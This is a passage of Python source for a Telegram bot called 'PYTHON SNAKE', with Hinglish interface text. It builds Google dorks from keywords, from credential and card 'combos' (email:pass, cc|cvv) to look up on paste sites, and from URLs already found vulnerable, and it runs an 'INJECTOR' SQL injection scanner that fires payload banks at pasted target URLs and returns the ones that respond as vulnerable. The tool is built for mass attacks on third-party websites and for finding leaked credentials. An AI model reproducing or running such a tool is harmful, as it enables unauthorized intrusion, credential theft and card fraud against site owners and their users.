        mark = "✅" if t.get("on") else "🚫"
        lines.append("%s <b>%02d.</b> <code>%s</code>" % (mark, t["id"], esc(t["tpl"])))
    lines.append("")
    lines.append(P("Legend: (KW)=keyword (DE)=domain (PF)=page-filter "
                   "(PT)=param (FT)=filetype (SF)=search-filter (NB)=number (CO)=combo"))
    return "\n".join(lines)


async def cb_pro_cfg(update, context):
    q = update.callback_query
    try:
        await q.edit_message_text(pro_cfg_text()[:3800], parse_mode=ParseMode.HTML,
                                  reply_markup=kb_back("dd:pro"))
    except Exception:
        pass


def pro_tpl_kb() -> InlineKeyboardMarkup:
    cfg = pro_load()
    rows = []
    for t in cfg["templates"]:
        mark = "✅" if t.get("on") else "🚫"
        rows.append([InlineKeyboardButton("%s %02d. %s" % (mark, t["id"], t["tpl"][:34]),
                                          callback_data="dp:tpl:%d" % t["id"])])
    rows.append([InlineKeyboardButton("✅ ALL ON", callback_data="dp:tplall:1"),
                 InlineKeyboardButton("🚫 ALL OFF", callback_data="dp:tplall:0")])
    rows.append([InlineKeyboardButton("📊 CONFIG", callback_data="dp:cfg"),
                 InlineKeyboardButton("⬅️ BACK", callback_data="dd:pro")])
    return RK(rows)


async def cb_pro_tpl(update, context, arg: str = ""):
    q = update.callback_query
    cfg = pro_load()
    if arg.startswith("tplall:"):
        val = arg.endswith("1")
        for t in cfg["templates"]:
            t["on"] = val
        pro_save(cfg)
        arg = ""
    elif arg.startswith("tpl:"):
        try:
            tid = int(arg[4:])
        except Exception:
            tid = 0
        for t in cfg["templates"]:
            if t["id"] == tid:
                t["on"] = not t.get("on")
        pro_save(cfg)
        arg = ""
    on = len(pro_on_templates(cfg))
    try:
        await q.edit_message_text(
            (H("VIEW TEMPLATES", "%d/%d ON" % (on, len(cfg["templates"]))) + "\n\n"
             "%s\n\n" % KV("Enabled", "<code>%d/%d</code>" % (on, len(cfg["templates"])), "✅")
             + "%s\n\n" % P("Tap any template to turn it ON/OFF")
             + "%s\n" % P("Templates that are OFF are not used in dorks")
             + "%s" % KV("Status", "✅ ON  •  🚫 OFF")),
            parse_mode=ParseMode.HTML, reply_markup=pro_tpl_kb())
    except Exception:
        pass


# ── RESET ───────────────────────────────────────────────────────────────────
async def cb_pro_reset(update, context, arg: str = ""):
    q = update.callback_query
    if arg == "yes":
        pro_reset()
        try:
            await q.edit_message_text(
                (H("RESET DONE", "default pe wapas") + "\n\n"
                 "%s\n%s"
                 % (KV("Templates", "<code>%d</code> ON" % len(PRO_TEMPLATES_DEFAULT), "♻️"),
                    P("All config + templates are back to default"))),
                parse_mode=ParseMode.HTML, reply_markup=kb_back("dd:pro"))
        except Exception:
            pass
        return
    if arg == "no":
        return await cb_pro_menu(update, context)
    try:
        await q.edit_message_text(
            (H("RESET TO DEFAULT", "to confirm") + "\n\n"
             "⚠️ <b>%s</b>\n\n"
             "%s\n%s\n%s\n\n"
             "<b>%s</b>"
             % (B("This will delete everything"), P("• domains, params, filetypes"),
                P("• filters, combos"), P("• custom templates"),
                B("Reset everything for sure?"))),
            parse_mode=ParseMode.HTML, reply_markup=RK([
                [InlineKeyboardButton("✅ HAAN, RESET", callback_data="dp:reset:yes")],
                [InlineKeyboardButton("❌ NO, GO BACK", callback_data="dp:reset:no")],
            ]))
    except Exception:
        pass


# ── COMBOS ──────────────────────────────────────────────────────────────────
def combos_kb() -> InlineKeyboardMarkup:
    cfg = pro_load()
    rows = []
    for i, c in enumerate(cfg["combos"][:24]):
        rows.append([InlineKeyboardButton("❌ %s" % c[:28], callback_data="dp:combo:x:%d" % i)])
    rows.append([InlineKeyboardButton("➕ NAYA COMBO ADD", callback_data="dp:combo:add")])
    rows.append([InlineKeyboardButton("🎯 IN COMBOS DORKS", callback_data="dp:combo:gen")])
    rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="dd:pro")])
    return RK(rows)


async def cb_pro_combos(update, context, arg: str = ""):
    q = update.callback_query
    cfg = pro_load()
    if arg.startswith("x:"):
        try:
            i = int(arg[2:])
            gone = cfg["combos"].pop(i)
        except Exception:
            gone = "?"
        pro_save(cfg)
        try:
            await q.answer("❌ %s hataya" % gone[:30])
        except Exception:
            pass
        arg = ""
    elif arg == "add":
        try:
            await q.edit_message_text(
                (H("ADD COMBO", "custom combo") + "\n\n"
                 "Combo bhejo (ek line me ek):\n"
                 "<code>email:pass</code>\n<code>user:password</code>\n"
                 "<code>cc|cvv</code>\n\n"
                 "<i>Ye (CO) placeholder me use hote hain.</i>"),
                parse_mode=ParseMode.HTML, reply_markup=kb_back("dp:combos"))
        except Exception:
            pass
        await_set(context, "pro_combo")
        return
    elif arg == "gen":
        if not cfg["combos"]:
            try:
                await q.answer("No combos", show_alert=True)
            except Exception:
                pass
            return
        out = []
        for c in cfg["combos"]:
            for p in PRO_TEMPLATES_COMBO:
                out.append(p.replace("(CO)", c))
        out = _dork_finish(_uniq(out), DORK_MAX)
        context.user_data["last_dorks"] = out
        path, cnt = dump_text(out, "combos", "PYTHON SNAKE — combo dorks")
        try:
            await q.edit_message_text(
                (H("COMBO DORKS", "%s bane" % fmt(cnt)) + "\n\n"
                 "🧬 Combos : <code>%d</code>\n\n<b>Top 8:</b>\n%s"
                 % (len(cfg["combos"]), short_list(out[:8], 8))),
                parse_mode=ParseMode.HTML, reply_markup=kb_back("dp:combos"))
        except Exception:
            pass
        await send_file(update, path, "🧬 %s combo dorks" % fmt(cnt))
        return
    # default: list
    try:
        await q.edit_message_text(
            (H("GEN ALL COMBOS", "%d combos" % len(cfg["combos"])) + "\n\n"
             "🧬 <b>%s</b>\n\n<code>%s</code>\n\n%s\n%s"
             % (B("Combos"), esc("  ".join(cfg["combos"][:20])),
                P("❌ dabao = remove  •  ➕ = naya add"),
                P("🎯 = build dorks for every combo"))),
            parse_mode=ParseMode.HTML, reply_markup=combos_kb())
    except Exception:
        pass


PRO_TEMPLATES_COMBO = [
    '"{co}" ext:txt', '"{co}" filetype:log', 'inurl:{co}', 'intitle:"{co}"',
    '"{co}" site:pastebin.com', '"{co}" inurl:paste', '"{co}" ext:csv',
    '"{co}" intext:"{co}"', '"{co}" -site:github.com',
]


async def input_pro_combo(update, context, text: str):
    items = [x.strip() for x in PARSE_STRIP.split(text) if x.strip()]
    items = [x for x in items if ":" in x or "|" in x or "@" in x]
    if not items:
        await update.effective_message.reply_text(
            "❌ Could not read that combo. Format: <code>email:pass</code>",
            parse_mode=ParseMode.HTML)
        await_set(context, "pro_combo")
        return
    cfg = pro_load()
    cfg["combos"] = _uniq(cfg["combos"] + items)[:100]
    pro_save(cfg)
    await update.effective_message.reply_text(
        (H("COMBOS SAVED", "%d total" % len(cfg["combos"])) + "\n\n<code>%s</code>"
         % esc("  ".join(items[:10]))),
        parse_mode=ParseMode.HTML, reply_markup=combos_kb())
    await_clear(context)


# ── PRO GEN (count → keywords → best template) ───────────────────────────────
async def cb_pro_gen(update, context):
    q = update.callback_query
    try:
        await q.edit_message_text(
            (H("GEN DORKS (PRO)", "step 1 / 2") + "\n\n"
             "🔢 <b>%s</b>\n\n%s\n%s"
             % (B("How many dorks?"),
                KV("Range", "1 – %s" % fmt(DORK_MAX)),
                KV("Recommended", "2,000"))),
            parse_mode=ParseMode.HTML, reply_markup=kb_back("dd:pro"))
    except Exception:
        pass
    await_set(context, "dpgen_count")


async def input_dpgen_count(update, context, text: str):
    pf = _take_pending(context, "dpgen_count")
    try:
        n = int(re.sub(r"[^0-9]", "", text or "") or "2000")
    except Exception:
        n = 2000
    n = max(1, min(DORK_MAX, n))
    context.user_data["dpgen_count"] = n
    cfg = pro_load()
    await update.effective_message.reply_text(
        (H("GEN DORKS (PRO)", "step 2 / 2") + "\n\n"
         "%s\n%s\n%s\n\n🔑 <b>%s</b>\n\n<code>shopify store, crypto wallet</code>"
         % (KV("Count", "<code>%s</code>" % fmt(n), "✅"),
            KV("Templates", "<code>%d/%d</code> ON"
               % (len(pro_on_templates(cfg)), len(cfg["templates"])), "🧩"),
            KV("Domains", "<code>%d</code>" % len(cfg["domains"]), "🌐"),
            B("Now send keywords"))),
        parse_mode=ParseMode.HTML, reply_markup=kb_back("dd:pro"))
    await_set(context, "dpgen_kw")
    if pf:
        await update.effective_message.reply_text(
            "📂 Took <b>%d keywords</b> from the file — building PRO dorks…"
            % len(pf), parse_mode=ParseMode.HTML)
        return await input_dpgen_kw(update, context, "\n".join(pf))


async def input_dpgen_kw(update, context, text: str):
    ok, err = kind_check(text, "keywords", "keywords")
    if not ok:
        await update.effective_message.reply_text(err, parse_mode=ParseMode.HTML,
                                                  reply_markup=kb_back("dd:pro"))
        await_set(context, "dpgen_kw")
        return
    n = int(context.user_data.get("dpgen_count") or 2000)
    msg = await update.effective_message.reply_text("🚀 Selecting the best templates…")
    t0 = time.time()
    res = pro_gen_best(text, n=n)
    dorks = res["dorks"]
    took = time.time() - t0
    if not dorks:
        await msg.edit_text("❌ 0 dorks — check the templates (are they all OFF?).")
        return
    context.user_data["last_dorks"] = dorks
    added = dork_seen_add(dorks)
    sc = [score_dork(d)[0] for d in dorks]
    avg = sum(sc) / len(sc)
    path, cnt = dump_text(dorks, "pro", "PYTHON SNAKE — pro dorks")
    try:
        await msg.delete()
    except Exception:
        pass
    await update.effective_message.reply_text(
        (H("PRO GEN — DONE", "%s dorks" % fmt(cnt)) + "\n\n"
         "%s\n%s\n%s\n%s\n%s\n%s\n%s\n\n<b>%s</b>\n%s"
         % (KV("Keywords", "<code>%d</code>" % res["kw"], "🔑"),
            KV("Gap fix", "<code>%d</code> multi-word → slug/quote"
               % sum(1 for _k in kw_cores(text) if " " in _k), "🧹"),
            KV("Best templates", "<code>%d</code> used" % res["used"], "🧩"),
            KV("Bane", "<code>%s</code>" % fmt(cnt), "✅"),
            KV("Naye", "<code>%s</code>" % fmt(added), "🆕"),
            KV("Avg score", "<code>%.0f/100</code>" % avg, "⭐"),
            KV("Time", "<code>%.2fs</code>" % took, "⏱"),
            B("Top 8"), short_list(dorks[:8], 8))),
        parse_mode=ParseMode.HTML, reply_markup=RK([
            [InlineKeyboardButton("🚀 DEEP SCAN", callback_data="pr:deep")],
            [InlineKeyboardButton("📊 CONFIG", callback_data="dp:cfg"),
             InlineKeyboardButton("🆕 MORE (fresh)", callback_data="dd:more")],
            [InlineKeyboardButton("⬅️ BACK", callback_data="dd:pro")],
        ]))
    await send_file(update, path, "🚀 %s pro dorks • avg %.0f/100" % (fmt(cnt), avg))
    await_clear(context)


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL: HQ KEYWORDS
# ═══════════════════════════════════════════════════════════════════════════════
async def tool_kw(update, context):
    q = update.callback_query
    txt = (H("HQ KEYWORD GENERATOR", "seeds or your own keywords") + "\n\n"
           "%s\n\n"
           "1️⃣ <b>%s</b>\n   %s\n"
           "   <code>shopify store, crypto wallet, apk download</code>\n\n"
           "2️⃣ <b>%s</b>\n   %s\n\n"
           "➡️ %s"
           % (B("Two ways — both work"),
              B("Send a seed"), P("2-3 topics"),
              B("Paste your own keywords"), P("one per line — new ones are built from them"),
              KV("Next step", "how many you need (max 100,000)"))
           + "\n\n" + P("💡 You can also send a full keyword file — "
                           ".txt .csv .json .xlsx .docx all work."))
    try:
        await q.edit_message_text(txt, parse_mode=ParseMode.HTML, reply_markup=RK([
            [InlineKeyboardButton("📁 MY NICHES (add / use)", callback_data="kw:niche")],
            [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")],
        ]))
    except Exception:
        pass
    await_set(context, "kw_input")


async def input_kw_input(update, context, text: str):
    """Step 1 — seeds YA keywords accept karo, phir count poochho."""
    got = detect_kind(text, want="keywords")
    if got == "dorks":
        await update.effective_message.reply_text(
            (H("WRONG INPUT", "these are dorks") + "\n\n"
             "❌ <b>These are not keywords — they are DORKS.</b>\n\n"
             "This step needs <b>keywords</b>, for example:\n"
             "<code>shopify store, crypto wallet</code>\n\n"
             "👉 Want dorks instead? Use 🎯 DORKER."),
            parse_mode=ParseMode.HTML, reply_markup=kb_back("m:kw"))
        await_set(context, "kw_input")
        return
    items = [x.strip() for x in re.split(r"[\n,;|]+", text or "") if x.strip()]
    cores = kw_cores(items)
    if not cores:
        await update.effective_message.reply_text(
            "❌ Could not understand that. Send seeds (e.g. <code>shopify store</code>)",
            parse_mode=ParseMode.HTML)
        return
    context.user_data["kw_items"] = items[:2000]
    context.user_data["kw_cores"] = cores[:800]
    cap = kw_capacity(cores)
    kind = "KEYWORDS" if len(items) > 3 else "SEEDS"
    preview = short_list(cores[:6], 6)
    txt = (H("HQ KEYWORDS — COUNT", "%d %s found" % (len(cores), kind)) + "\n\n"
           "%s\n%s\n\n<b>%s</b>\n%s\n\n"
           "🔢 <b>%s</b>\n%s"
           % (KV("Detect", "<b>%s</b> (%d lines)" % (kind, len(items)), "🔎"),
              KV("Max", "<code>%s</code> keywords is input se"
                 % fmt(min(cap, KW_MAX)), "📊"),
              B("Preview"), preview,
              B("How many keywords?"),
              KV("Range", "1 – 100,000  •  Recommended: 5,000")))
    await update.effective_message.reply_text(txt, parse_mode=ParseMode.HTML,
                                              reply_markup=kb_back("m:kw"))
    await_set(context, "kw_count")


async def input_kw_count(update, context, text: str):
    """Step 2 — count lo, generate karo, file bhejo."""
    try:
        n = int(re.sub(r"[^0-9]", "", text or "") or "5000")
    except Exception:
        n = 5000
    n = max(1, min(KW_MAX, n))
    pf = _take_pending(context, "kw_count")
    items = context.user_data.get("kw_items") or []
    if pf and not items:
        items = pf
        context.user_data["kw_items"] = pf
    if not items:
        await update.effective_message.reply_text(
            "❌ Send seeds/keywords first — 🏠 menu → 🔑 HQ KEYWORDS",
            reply_markup=kb_back("m:kw"))
        return
    msg = await update.effective_message.reply_text("⏳ Building %s keywords…" % fmt(n))
    t0 = time.time()
    kws = make_keywords(items, n=n)
    took = time.time() - t0
    if not kws:
        await msg.edit_text("❌ Nothing generated — check the seed.")
        return
    qrep = kw_quality(kws)
    context.user_data["last_kws"] = kws
    context.user_data["last_kw_items"] = items
    context.user_data["last_kw_n"] = n
    path, cnt = dump_text(kws, "keywords",
                          "PYTHON SNAKE — HQ keywords (%s)" % str(items[0])[:50])
    txt = (H("HQ KEYWORDS — DONE", "%s bane" % fmt(cnt)) + "\n\n"
           "%s\n%s\n%s\n%s\n%s\n%s\n\n<b>%s</b>\n%s"
           % (KV("Input", "<code>%d lines</code>" % len(items), "🌱"),
              KV("Manga", "<code>%s</code>" % fmt(n), "🔢"),
              KV("Bane", "<code>%s</code> unique" % fmt(cnt), "✅"),
              KV("Avg score", "<code>%.0f/100</code>" % qrep["avg"], "⭐"),
              KV("80+", "<code>%s</code>" % fmt(qrep["b80"]), "🔥"),
              KV("Time", "<code>%.2fs</code>" % took, "⏱"),
              B("Top 8"), short_list(kws[:8], 8)))
    if cnt < n:
        txt += ("\n\n⚠️ <i>This input could only produce %s — add more seeds "
                "100,000 tak jayega.</i>" % fmt(cnt))
    try:
        await msg.delete()
    except Exception:
        pass
    for ch in chunk_lines(txt)[:2]:
        await update.effective_message.reply_text(ch, parse_mode=ParseMode.HTML)
    await update.effective_message.reply_text(
        "👇 What next?",
        reply_markup=RK([
            [InlineKeyboardButton("🎯 MAKE DORKS", callback_data="kw:dorks")],
            [InlineKeyboardButton("📊 QUALITY REPORT", callback_data="kw:qual"),
             InlineKeyboardButton("🔁 MORE (new)", callback_data="kw:more")],
            [InlineKeyboardButton("⬅️ BACK", callback_data="m:kw")],
        ]))
    await send_file(update, path, "🔑 %s keywords • avg %.0f/100" % (fmt(cnt), qrep["avg"]))
    await_clear(context)


def kw_to_dorks(kws, n: int = 3000, tld: str = "") -> list:
    """Keywords se REAL dorks banao (intitle / intext / inurl combos)."""
    out = []
    words = [str(k).strip()[:60] for k in (kws or []) if str(k).strip()][:400]
    tpl = [
        'intitle:"{k}"',
        'allintitle:"{k}"',
        'intext:"{k}"',
        'intext:"{k}" inurl:login',
        'intitle:"{k}" inurl:index',
        'intext:"{k}" filetype:pdf',
        'intitle:"{k}" ext:php',
        '"{k}" inurl:admin',
        'intext:"{k}" inurl:upload',
        'intitle:"{k}" inurl:dashboard',
    ]
    # template-major + keyword shift — chhote n me bhi har template aaye (variety)
    for b in range(len(tpl)):
        for ti, t in enumerate(tpl):
            for k in words:
                out.append(t.format(k=words[(words.index(k) + ti + b) % len(words)]))
                if len(out) >= n * 2:
                    break
            if len(out) >= n * 2:
                break
        if len(_uniq(out)) >= n:
            return _uniq(out)[:n]
    return _uniq(out)[:n]
    if tld:
        for k in words[:200]:
            out.append('site:.%s intitle:"%s"' % (tld.strip().lstrip("."), k))
    return _uniq(out)[:n]


def niche_kb() -> InlineKeyboardMarkup:
    """Mere niches — ➕ ADD NICHE + har niche ka button (ready packs nahi)."""
    rows = [[InlineKeyboardButton("➕ ADD NICHE", callback_data="nc:add")]]
    nch = niche_list()
    for i in range(0, len(nch), 2):
        row = []
        for nm in nch[i:i + 2]:
            kws = niche_get(nm) or []
            row.append(InlineKeyboardButton("📁 %s (%d)" % (nm[:16], len(kws)),
                                            callback_data="nc:use:%d" % nch.index(nm)))
        rows.append(row)
    rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:kw")])
    return RK(rows)


async def cb_niche(update, context, key: str = ""):
    """📁 MY NICHES — user ke apne niches (ready packs hataye ja chuke)."""
    q = update.callback_query
    mine = niche_list()
    lines = []
    for nm in mine[:12]:
        kws = niche_get(nm) or []
        lines.append(KV(esc(nm)[:20], "<code>%s</code> keywords" % fmt(len(kws)), "📁"))
    if mine:
        body = "\n".join(lines)
        if len(mine) > 12:
            body += "\n<i>+ %d more…</i>" % (len(mine) - 12)
    else:
        body = P("No niches yet. Tap ➕ ADD NICHE, send your keywords, "
                 "give it a name — it becomes a button here forever.")
    try:
        await q.edit_message_text(
            (H("MY NICHES", "%d saved" % len(mine)) + "\n\n" + body + "\n\n"
             + P("Your own keywords only — no ready-made packs anymore.") + "\n\n"
             + B("Pick a niche or add a new one")),
            parse_mode=ParseMode.HTML, reply_markup=niche_kb())
    except Exception:
        pass
    await_clear(context)


async def cb_kw_action(update, context, action: str):
    """kw:dorks | kw:qual | kw:more | kw:niche"""
    q = update.callback_query
    if action == "niche" or action.startswith("niche:"):
        return await cb_niche(update, context, action.split(":", 1)[1] if ":" in action else "")
    kws = context.user_data.get("last_kws") or []
    items = context.user_data.get("last_kw_items") or []
    if not kws and not items:
        try:
            await q.answer("Generate keywords first", show_alert=True)
        except Exception:
            pass
        return

    if action == "dorks":
        msg = await update.effective_message.reply_text("🎯 Building dorks from keywords…")
        dorks = kw_to_dorks(kws or items, n=4000)
        if not dorks:
            await msg.edit_text("❌ Nothing generated.")
            return
        context.user_data["last_dorks"] = dorks
        added = dork_seen_add(dorks)
        path, cnt = dump_text(dorks, "kw_dorks", "PYTHON SNAKE — keyword dorks")
        try:
            await msg.delete()
        except Exception:
            pass
        await update.effective_message.reply_text(
            (H("KEYWORDS ➪ DORKS", "%s dorks" % fmt(cnt)) + "\n\n"
             "🎯 Source keywords : <code>%s</code>\n"
             "🆕 Fresh added     : <code>%s</code>\n\n"
             "<b>Top 8:</b>\n%s" % (fmt(min(len(kws or items), 400)), fmt(added),
                                    short_list(dorks[:8], 8))),
            parse_mode=ParseMode.HTML,
            reply_markup=RK([
                [InlineKeyboardButton("🚀 DEEP SCAN", callback_data="pr:deep")],
                [InlineKeyboardButton("⬅️ BACK", callback_data="m:kw")],
            ]))
        await send_file(update, path, "🎯 %s dorks" % fmt(cnt))
        return

    if action == "qual":
        qrep = kw_quality(kws)
        hq = [k for k in kws if score_keyword(k)[0] >= 80]
        txt = (H("KEYWORD QUALITY", "avg %.0f/100" % qrep["avg"]) + "\n\n"
               "📦 Total : <code>%s</code>\n\n"
               "🔥 80+   : <code>%s</code>\n"
               "✅ 65-79 : <code>%s</code>\n"
               "🟡 45-64 : <code>%s</code>\n"
               "🟠 25-44 : <code>%s</code>\n"
               "🔴 <25   : <code>%s</code>\n\n"
               "<b>Top 5:</b>\n%s\n"
               "<b>Sabse kamzor:</b>\n%s"
               % (fmt(qrep["total"]), fmt(qrep["b80"]), fmt(qrep["b65"]),
                  fmt(qrep["b45"]), fmt(qrep["b25"]), fmt(qrep["b0"]),
                  short_list(qrep["top"][:5], 5), short_list(qrep["worst"], 5)))
        try:
            await q.edit_message_text(txt, parse_mode=ParseMode.HTML,
                                      reply_markup=kb_back("m:kw"))
        except Exception:
            pass
        if hq:
            path, cnt = dump_text(hq, "keywords_hq", "PYTHON SNAKE — HQ only (80+)")
            await send_file(update, path, "🔥 %s HQ keywords (80+)" % fmt(cnt))
        return

    if action == "more":
        n = int(context.user_data.get("last_kw_n") or 5000)
        msg = await update.effective_message.reply_text("🔁 Building a new batch…")
        extra = make_keywords(items, n=n, exclude=set(kws))
        took_note = ""
        if extra:
            context.user_data["last_kws"] = extra
            path, cnt = dump_text(extra, "keywords", "PYTHON SNAKE — fresh keywords")
            try:
                await msg.delete()
            except Exception:
                pass
            await update.effective_message.reply_text(
                (H("FRESH BATCH", "%s naye keywords" % fmt(cnt)) + "\n\n"
                 "%s\n\n<b>%s</b>\n%s"
                 % (KV("Purane skip", "<code>%s</code>" % fmt(len(kws)), "🆕"),
                    B("Top 6"), short_list(extra[:6], 6))),
                parse_mode=ParseMode.HTML,
                reply_markup=RK([
                    [InlineKeyboardButton("📊 QUALITY", callback_data="kw:qual"),
                     InlineKeyboardButton("🔁 AUR", callback_data="kw:more")],
                    [InlineKeyboardButton("⬅️ BACK", callback_data="m:kw")],
                ]))
            await send_file(update, path, "🔑 %s fresh keywords" % fmt(cnt))
        else:
            took_note = "❌ Is input ki capacity khatam. Naye seeds do."
            await msg.edit_text(took_note)
        return


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL: URL REVERSE
# ═══════════════════════════════════════════════════════════════════════════════
async def tool_rev(update, context):
    q = update.callback_query
    txt = (H("URL REVERSE", "2 modes", slot="rev") + "\n\n"
           + B("1) Normal reverse") + "\n"
           + P("URL do → host / path / ext / params nikaal ke dorks banate hain.") + "\n\n"
           + B("2) Vulnerable URL → UHQ dorks") + "\n"
           + P("Jo URL vulnerable nikla uska shape (file + param + ext + TLD) pakad ke "
               "waise hi doosre targets dhoondhte hain — <b>bina keywords</b>.") + "\n\n"
           + B("Paste URLs") + "\n"
           + "<code>https://shop.example.com/product.php?id=12&amp;cat=5</code>")
    kb = RK([
        [InlineKeyboardButton("💉 VULNERABLE URL → UHQ DORKS", callback_data="rv:vuln")],
        [InlineKeyboardButton("🔗 NORMAL REVERSE", callback_data="rv:normal")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")],
    ])
    try:
        await q.edit_message_text(txt, reply_markup=kb, parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def cb_rev_mode(update, context, mode: str = "normal"):
    """rv:normal / rv:vuln — input state set karo."""
    q = update.callback_query
    if mode == "vuln":
        try:
            await q.edit_message_text(
                (H("VULN → UHQ DORKS", "bina keywords", slot="rev") + "\n\n"
                 + P("Vulnerable URL(s) paste karo — jo injector ne diye.")
                 + "\n\n<code>https://site.com/product.php?id=12</code>\n\n"
                 + B("Kya milega") + "\n"
                 + "◆ same file + same param dorks\n"
                 + "◆ same extension / same folder shape\n"
                 + "◆ same TLD targets\n"
                 + "◆ error-page dorks (known SQL error)" ),
                parse_mode=ParseMode.HTML,
                reply_markup=RK([[InlineKeyboardButton("⬅️ BACK", callback_data="m:rev")]]))
        except Exception:
            pass
        await_set(context, "rev_vuln")
        return
    try:
        await q.edit_message_text(
            (H("URL REVERSE", "normal", slot="rev") + "\n\n"
             + P("Paste URL(s), one per line:") + "\n\n"
             + "<code>https://shop.example.com/product.php?id=12&amp;cat=5</code>"),
            parse_mode=ParseMode.HTML,
            reply_markup=RK([[InlineKeyboardButton("⬅️ BACK", callback_data="m:rev")]]))
    except Exception:
        pass
    await_set(context, "rev_urls")


async def input_rev_vuln(update, context, text: str):
    """Vulnerable URLs → UHQ dorks (keywords ke bina)."""
    urls = _urls_from_text(text, 50)
    if not urls:
        urls = [x.strip() for x in re.split(r"[\s,]+", text or "") if x.strip()][:50]
    infos = [i for i in (url_reverse(u) for u in urls) if i]
    if not infos:
        await update.effective_message.reply_text(
            "❌ Valid URL nahi mila. Poora URL bhejo: "
            "<code>https://site.com/page.php?id=1</code>", parse_mode=ParseMode.HTML,
            reply_markup=kb_back("m:rev"))
        return
    dorks = vuln_reverse_dorks(urls, n=90)
    if not dorks:
        await update.effective_message.reply_text(
            "❌ Is URL se dork nahi bane (path/parameter missing).",
            reply_markup=kb_back("m:rev"))
        return
    context.user_data["last_dorks"] = dorks
    lines = []
    for i in infos[:4]:
        lines.append("◆ <b>%s</b>\n   file <code>%s</code> · ext <code>%s</code> · "
                     "param <code>%s</code>"
                     % (esc(i.get("host") or "?"), esc(i.get("file") or "—"),
                        esc(i.get("ext") or "—"),
                        esc(", ".join(i.get("params") or []) or "—")))
    body = (H("VULN → UHQ DORKS", "%d dorks" % len(dorks), slot="rev") + "\n\n"
            + "\n\n".join(lines) + "\n\n"
            + B("Top dorks") + "\n" + short_list(dorks[:10], 10) + "\n\n"
            + P("Sirf structure — koi keyword nahi. Ye dorks wahi technology / wahi "
                "parameter shape wale targets dhoondhte hain."))
    for ch in chunk_lines(body)[:2]:
        await update.effective_message.reply_text(ch, parse_mode=ParseMode.HTML)
    await update.effective_message.reply_text(
        "👇 Next?",
        reply_markup=RK([
            [InlineKeyboardButton("🚀 DEEP SCAN THESE DORKS", callback_data="pr:deep")],
            [InlineKeyboardButton("🎯 MAKE MORE", callback_data="rv:vuln")],
            [InlineKeyboardButton("⬅️ BACK", callback_data="m:rev")],
        ]))
    path, cnt = dump_text(dorks, "vuln_reverse", "PYTHON SNAKE — vuln URL → UHQ dorks")
    await send_file(update, path, "🔗 %d UHQ dorks" % cnt)
    await_clear(context)


async def input_rev_urls(update, context, text: str):
    urls = [x.strip() for x in re.split(r"[\s,]+", text) if x.strip()][:20]
    infos = [url_reverse(u) for u in urls]
    infos = [i for i in infos if i]
    if not infos:
        await update.effective_message.reply_text("❌ No valid URL found.")
        return
    lines = []
    all_dorks = []
    for i in infos:
        d = url_reverse_dorks(i, n=12)
        all_dorks += d
        lines.append("<b>%s</b>\n• host : <code>%s</code>\n• file : <code>%s</code>\n"
                     "• ext  : <code>%s</code>\n• params: <code>%s</code>\n• dorks: <code>%d</code>"
                     % (esc(i["host"] or "?"), esc(i["host"]), esc(i["file"] or "—"),
                        esc(i["ext"] or "—"), esc(", ".join(i["params"]) or "—"), len(d)))
    all_dorks = _uniq(all_dorks)
    path, cnt = dump_text(all_dorks, "url_reverse",
                          "PYTHON SNAKE — URL reverse dorks\n" + "\n".join(u for u in urls))
    body = (H("URL REVERSE — DONE") + "\n\n" + "\n\n".join(lines[:8]) +
            "\n\n🔗 <b>Total dorks</b>: <code>%d</code>\n\n%s" % (cnt, short_list(all_dorks[:10], 10)))
    parts = chunk_lines(body)
    for i, ch in enumerate(parts[:2]):
        await update.effective_message.reply_text(
            ch, parse_mode=ParseMode.HTML,
            reply_markup=kb_back("m:rev") if i == min(len(parts), 2) - 1 else None)
    await send_file(update, path, "🔗 %d reverse dorks" % cnt)
    await_clear(context)


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL: INJECTOR
# ═══════════════════════════════════════════════════════════════════════════════
async def tool_inj(update, context):
    """INJECTOR — asli scan: URLs do, sirf vulnerable wapas."""
    q = update.callback_query
    cat = context.user_data.get("inj_cat", "all")
    if cat not in CAT_LABEL:
        cat = "all"
    rows = []
    keys = [k for k in CAT_LABEL if k != "all"]
    rows.append([InlineKeyboardButton("🎯 ALL (%d probes)" % len(INJ_PROBES),
                                      callback_data="inj:cat:all")])
    for i in range(0, len(keys), 3):
        row = []
        for k in keys[i:i + 3]:
            label = CAT_LABEL[k] + ("  ✅" if k == cat else "")
            row.append(InlineKeyboardButton(label, callback_data="inj:cat:" + k))
        rows.append(row)
    rows.append([InlineKeyboardButton("🚀 SEND URLS (re-arm input)", callback_data="inj:go")])
    rows.append([InlineKeyboardButton("📥 LAST PARSER URLS (%d)" % len(context.user_data.get("last_urls") or []),
                                      callback_data="inj:last")])
    rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:home")])
    probes = inj_probes_for(cat)
    txt = (H("SQLi SCANNER", "step 1 — send URLs") + "\n\n"
           + B("Paste URLs now") + "\n"
           + P("one per line, or send a .txt file — as many URLs as you have.") + "\n"
           + "<code>https://target.com/product.php?id=1</code>\n\n"
           + B("Step 2 — pick probes") + "\n"
           + P("Default is ALL. Pick a category below to run only those probes.")
           + "\n\n"
           + KV("Category", "<b>%s</b>" % CAT_LABEL.get(cat, cat), "🎯") + "\n"
           + KV("Probes / param", "<code>%d</code>" % len(probes), "🔍") + "\n"
           + KV("Payload bank", "<code>%s</code> in %d categories"
               % (fmt(len(PAYLOADS)), len(PAYLOAD_CATS)), "💉") + "\n"
           + KV("DBMS fingerprints", "<code>%s</code> • %d databases"
               % (fmt(DBMS_COUNT), len(DBMS_ERRORS)), "🧬") + "\n"
           + KV("Timeout / target", "<code>%ss</code> • max <code>%s</code> tests per URL"
               % (int(sget("inj_timeout", 8) or 8), fmt(int(sget("inj_targets", 24) or 24))), "⏱") + "\n\n"
           + B("How it works") + "\n"
           + P("Send URLs (paste or .txt file). Every parameter gets tested with real "
               "payloads, and the response is checked for DB errors, reflection, traversal "
               "or template evaluation.") + "\n\n"
           + P("Only vulnerable URLs are returned — clean pages are dropped."))
    try:
        await q.edit_message_text(txt, reply_markup=RK(rows), parse_mode=ParseMode.HTML)
    except Exception:
        pass
    await_set(context, "inj_urls")          # screen khulte hi URL input ready


async def cb_inj_cat(update, context, cat: str):
